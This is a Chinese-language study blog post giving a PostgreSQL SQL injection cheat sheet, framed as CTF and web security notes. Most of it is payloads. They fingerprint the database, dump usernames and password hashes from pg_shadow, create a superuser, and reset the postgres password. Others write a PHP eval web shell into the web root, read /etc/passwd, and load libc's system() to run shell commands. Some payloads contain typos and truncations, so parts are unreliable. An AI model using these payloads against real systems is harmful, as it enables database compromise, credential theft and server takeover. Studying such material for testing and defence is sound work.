---
layout:     post
title:      Web笔记（五）SQL注入之PostgreSQL
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是PostgreSQL的SQL注入。
date:       2020-11-29
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
    - PostgreSQL
---



## 0x00 PostgreSQL介绍
postgresql是以加州大学伯克利分校计算机系开发的POSTGRES，现在已经更名为PostgreSQL，版本4.2为基础的对象关系型数据库管理系统（ORDBMS）。

PostgreSQL支持大部分SQL标准并且提供了许多其他现代特性：复杂查询、外键、触发器、视图、事务完整性、MVCC。同样，PostgreSQL可以用许多方法扩展，比如，通过增加新的数据类型、函数、操作符、聚集函数、索引。

免费使用、修改、和分发PostgreSQL，不管是私用、商用、还是学术研究使用。



## 0x01 常用场景

php+PostgreSQL



## 0x02 常用注入攻击

#### 1. 判断是否为PostgreSQL数据库
```
id=1+and+1::int=1-- 
```

#### 2. 判断数据库版本信息
```
id=1+and+1=cast(version() as int)-- 
```

#### 3. 判断当前用户
```
id=1 and 1=cast(user||123 as int)-- 
```

#### 4. 判断有多少字段
```
id=1 order by N -- 
id=-1 union select null,null,null -- 
id=-1 union select null,user,null -- 		判断当前用户，user是函数，不用加括号
```

#### 5. 判断数据库版本信息
```
id=-1 union select null,version(),null-- 
```

#### 6. 判断用户权限
```
id=-1+union+select+null,current_schema(),null--
```

#### 7. 判断当前数据库名称
```
id=-1+union+select+null,current_database(),null
```

#### 8. 判断当前表名
```
id=-11+union+select+null,rel
```

#### 9. 列字段内容
```
id=-1+union+select+null,name||pass,nul+from+admin
```

#### 10. 查看PostgreSQL数据库的账号密码

```
id=-1+union+select+null,username||chr(124)||passwd,null+from+pg_shadow
```

#### 10. 创建用户

- 创建用户

```
id=1;create+user+seven+with+superuser+password+'seven'-- 													
```

- 修改PostgreSQL的用户密码为123456

```
id=1;alter+user+postgres+with+password+'123456'-- 
```

#### 11. 写shell

- 直接拿shell

```
id=1;create table shell(shell text not null); -- 
id=1;insert into shell values($$<?php @eval($_POST[cmd]);?>$$); -- 
id=1;copy shell(shell) to '/var/www/html/shell.php' -- 
```

- 或者直接一个命令写shell

```
id=1;copy (select '$$<?php @eval($_POST[cmd]);?>$$') to 'c:/xxx/wwwroot/test.php' -- 
```

#### 12. 读取文件前20行
```
id=1;pg_read_file('/etc/passwd',1,20) -- 
```

#### 13. 创建system函数
用于版本大于8的数据库。

```
# 创建一个system的函数
id=1;create FUNCTION system(ctring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT -- 

# 创建一个输出表
id=1;create table stdout(id serial, system_out text) -- 

# 执行shell，输出到输出表内
id=1;select system('uname -a >/tmp/test') -- 

# copy输出的内容到表里面
id=1;COPY stdout(system_out) FROM '/tmp/test' -- 

# 从输出表内读取执行后的回显，判断是否执行成功
id=-1 union all select NULL,(select stdout from system_out order by id desc),NULL,limit 1 offset 1 -- 
```



## 0x03 数据库备份还原

#### 1. 备份数据库

```
# 本地备份
pg_dump -O -h 192.168.0.5 -U postgres -d mdb >c:/mdb.sql

# 从远程备份数据库到本地
pg_dump -O -h 192.168.0.5 -U dbowner -w -p 5432 SS >SS.sql
```

- \-h 指定数据库主机名
- \-U 指定用户名
- \-O 指定在明文格式中，忽略恢复对象所有者，即no-owner
- \-w 指定不提示输入口令，即no-password
- \-p 指定端口号
- \-d 指定备份的数据库名也可以不指定，直接写在倒数第二项

#### 2. 还原数据库

```
psql -h localhost -U postgres -d mdb
```



## 0x04 其他注意点

postgresql的用户如果是postgre，其权限相当于系统root权限。